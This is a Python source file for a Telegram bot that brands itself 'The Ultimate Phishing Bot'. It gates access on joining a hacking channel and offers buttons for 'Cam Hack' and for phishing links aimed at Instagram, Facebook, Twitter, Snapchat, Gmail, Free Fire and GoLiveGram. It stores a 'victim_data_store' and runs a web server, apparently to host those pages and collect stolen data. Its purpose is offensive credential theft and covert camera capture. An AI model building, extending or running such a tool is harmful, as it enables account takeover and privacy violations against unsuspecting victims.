import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
import json
import os
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.buttons import (
    handle_cam_hack,
    handle_insta_button, handle_insta_callback,
    handle_face_button, handle_face_callback,
    handle_twit_button, handle_twit_callback,
    handle_snap_button, handle_snap_callback,
    handle_gmail_button, handle_gmail_callback,
    handle_freefire_button, handle_freefire_callback,
    handle_golive_button, handle_golive_callback,
    handle_all_links, handle_copy_all
)
from bot.server import app
from bot.utils.storage import link_cache, victim_data_store

bot = telebot.TeleBot(BOT_TOKEN)

# ========== OWNER ID ==========
OWNER_ID = 7993444324  # <-- APNI TELEGRAM ID DAAL

# ========== BROADCAST STATE ==========
broadcast_mode = False
ACTIVE_USERS_FILE = "active_users.json"

def load_active_users():
    if os.path.exists(ACTIVE_USERS_FILE):
        try:
            with open(ACTIVE_USERS_FILE, 'r') as f:
                return set(json.load(f))
        except:
            return set()
    return set()

def save_active_users(users_set):
    try:
        with open(ACTIVE_USERS_FILE, 'w') as f:
            json.dump(list(users_set), f)
    except Exception as e:
        print(f"Save error: {e}")

active_users = load_active_users()

# ========== CHECK JOIN ==========
def check_user_joined(user_id):
    try:
        chat_member = bot.get_chat_member("@nr_hackz", user_id)
        return chat_member.status not in ['left', 'kicked']
    except:
        return False

# ========== BOTTOM BUTTONS ==========
def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("📸 Cam Hack"),
        KeyboardButton("📸 Instagram"),
        KeyboardButton("📘 Facebook"),
        KeyboardButton("🐦 Twitter"),
        KeyboardButton("👻 Snapchat"),
        KeyboardButton("📧 Gmail"),
        KeyboardButton("🎮 Free Fire"),
        KeyboardButton("🎬 GoLiveGram"),
        KeyboardButton("🔗 All Links")
    )
    return markup

# ========== JOIN BUTTONS ==========
def get_join_buttons():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Join @nr_hackz", url="https://t.me/nr_hackz"),
        InlineKeyboardButton("✅ I have joined", callback_data="verify_join")
    )
    return markup

# ========== /HUKUM COMMAND (OWNER ONLY) ==========
@bot.message_handler(commands=['hukum'])
def hukum_command(message):
    user_id = message.chat.id

    if user_id != OWNER_ID:
        bot.reply_to(message, "❌ Ye command sirf owner ke liye hai.")
        return

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🟢 ON", callback_data="broadcast_on"),
        InlineKeyboardButton("🔴 OFF", callback_data="broadcast_off")
    )

    bot.send_message(
        user_id,
        "⚙️ *Broadcast Control*\n\n"
        "🟢 ON — Start broadcast\n"
        "🔴 OFF — Stop broadcast\n\n"
        "Current status: " + ("🟢 ON" if broadcast_mode else "🔴 OFF") + "\n"
        f"👥 Total Users: {len(active_users)}",
        reply_markup=markup,
        parse_mode="Markdown"
    )

# ========== BROADCAST CALLBACK ==========
@bot.callback_query_handler(func=lambda call: call.data in ["broadcast_on", "broadcast_off"])
def broadcast_callback(call):
    global broadcast_mode
    user_id = call.from_user.id

    if user_id != OWNER_ID:
        bot.answer_callback_query(call.id, "❌ Ye sirf owner ke liye hai.")
        return

    if call.data == "broadcast_on":
        broadcast_mode = True
        bot.answer_callback_query(call.id, "🟢 Broadcast ON")
        bot.send_message(
            user_id,
            f"🟢 *Broadcast ON*\n\n"
            f"👥 Total Users: {len(active_users)}\n\n"
            "Ab tu jo bhi message bhejega, woh saare active users ko chala jayega.",
            parse_mode="Markdown"
        )
    elif call.data == "broadcast_off":
        broadcast_mode = False
        bot.answer_callback_query(call.id, "🔴 Broadcast OFF")
        bot.send_message(
            user_id,
            "🔴 *Broadcast OFF*\n\nAb bot normal chalega.",
            parse_mode="Markdown"
        )

# ========== /START ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id

    active_users.add(user_id)
    save_active_users(active_users)

    if check_user_joined(user_id):
        show_main_menu(message)
        return
    else:
        bot.send_message(
            user_id,
            "🔐 *Access Restricted*\n\n"
            "You must join @nr_hackz to use this bot.\n\n"
            "👉 [Join @nr_hackz](https://t.me/nr_hackz)\n\n"
            "After joining, click the button below to verify.",
            reply_markup=get_join_buttons(),
            parse_mode="Markdown"
        )

# ========== VERIFY ==========
@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    user_id = call.from_user.id

    if check_user_joined(user_id):
        bot.answer_callback_query(call.id, "✅ Verified!")
        bot.send_message(
            user_id,
            "✅ *Welcome!*\n\nYou can now use all features.",
            reply_markup=get_bottom_buttons(),
            parse_mode="Markdown"
        )
    else:
        bot.answer_callback_query(
            call.id,
            "❌ You haven't joined @nr_hackz yet! Please join first.",
            show_alert=True
        )

# ========== MAIN MENU ==========
def show_main_menu(message):
    user_id = message.chat.id
    bot.send_message(
        user_id,
        "🔥 *NR HACKZ* 🔥\n"
        "╔═══════════════════════════════╗\n"
        "║  ⚡ The Ultimate Phishing Bot ⚡  ║\n"
        "╚═══════════════════════════════╝\n\n"
        "💀 *Welcome, Commander.*\n"
        "🔐 Your journey to the dark side begins here.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 *Choose your weapon:*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📸 Cam Hack (working)\n"
        "📸 Instagram (working)\n"
        "📘 Facebook (working)\n"
        "🐦 Twitter (working)\n"
        "👻 Snapchat (working)\n"
        "📧 Gmail (working)\n"
        "🎮 Free Fire (working)\n"
        "🎬 GoLiveGram (working)\n"
        "🔗 All Links (working)\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💬 *Use buttons below or type commands.*\n"
        "⚠️ *Stay anonymous. Stay safe.*",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== ROUTING ==========
@bot.message_handler(func=lambda message: True)
def route_buttons(message):
    global broadcast_mode
    text = message.text
    user_id = message.chat.id

    if user_id not in active_users:
        active_users.add(user_id)
        save_active_users(active_users)

    # ===== BROADCAST MODE =====
    if broadcast_mode and user_id == OWNER_ID:
        if text and text.startswith('/'):
            return

        success_count = 0
        fail_count = 0

        for uid in list(active_users):
            try:
                bot.send_message(uid, text)
                success_count += 1
                time.sleep(0.05)
            except Exception as e:
                fail_count += 1
                if "blocked" in str(e).lower() or "chat not found" in str(e).lower():
                    active_users.discard(uid)

        save_active_users(active_users)

        bot.send_message(
            OWNER_ID,
            f"📢 *Broadcast Complete*\n\n"
            f"✅ Sent: {success_count}\n"
            f"❌ Failed: {fail_count}\n"
            f"👥 Total Users: {len(active_users)}",
            parse_mode="Markdown"
        )
        return

    # ===== NORMAL ROUTING =====
    if not check_user_joined(user_id):
        bot.send_message(user_id, "❌ You must join @nr_hackz first. Send /start again.", reply_markup=get_join_buttons())
        return

    if text == "📸 Cam Hack":
        handle_cam_hack(bot, message, get_bottom_buttons)
    elif text == "📸 Instagram":
        handle_insta_button(bot, message, get_bottom_buttons)
    elif text == "📘 Facebook":
        handle_face_button(bot, message, get_bottom_buttons)
    elif text == "🐦 Twitter":
        handle_twit_button(bot, message, get_bottom_buttons)
    elif text == "👻 Snapchat":
        handle_snap_button(bot, message, get_bottom_buttons)
    elif text == "📧 Gmail":
        handle_gmail_button(bot, message, get_bottom_buttons)
    elif text == "🎮 Free Fire":
        handle_freefire_button(bot, message, get_bottom_buttons)
    elif text == "🎬 GoLiveGram":
        handle_golive_button(bot, message, get_bottom_buttons)
    elif text == "🔗 All Links":
        handle_all_links(bot, message, get_bottom_buttons)
    else:
        if user_id == OWNER_ID:
            return
        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

# ========== INLINE CALLBACKS ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    data = call.data

    if data in ["broadcast_on", "broadcast_off"]:
        return

    if data in ["ig_copy", "ig_back", "ig_menu"]:
        handle_insta_callback(bot, call)
        return
    if data in ["face_copy", "face_back", "face_menu"]:
        handle_face_callback(bot, call)
        return
    if data in ["twit_copy", "twit_back", "twit_menu"]:
        handle_twit_callback(bot, call)
        return
    if data in ["snap_copy", "snap_back", "snap_menu"]:
        handle_snap_callback(bot, call)
        return
    if data in ["gmail_copy", "gmail_back", "gmail_menu"]:
        handle_gmail_callback(bot, call)
        return
    if data in ["free_copy", "free_back", "free_menu"]:
        handle_freefire_callback(bot, call)
        return
    if data in ["golive_copy", "golive_back", "golive_menu"]:
        handle_golive_callback(bot, call)
        return
    if data == "copy_all":
        handle_copy_all(bot, call)
        return
    if data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")
        return
    if data == "verify_join":
        verify_join(call)
        return

# ========== RUN BOT ==========
def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("🤖 Demon Soky Lite Bot Running...")
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
